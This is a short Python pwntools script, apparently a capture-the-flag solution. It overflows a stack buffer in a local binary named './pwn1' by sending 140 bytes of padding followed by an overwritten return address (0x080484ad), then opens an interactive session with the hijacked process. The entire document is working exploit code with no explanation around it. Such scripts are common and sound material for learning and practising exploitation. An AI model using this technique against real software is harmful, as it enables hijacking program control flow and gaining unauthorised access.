from pwn import *
from pwnlib.util.packing import p32

garbage = 'a' * 140
target_address = 0x080484ad
address = p32(target_address)
msgin = garbage.encode('ascii') + address

p = process('./pwn1')
p.sendline(msgin)
p.interactive()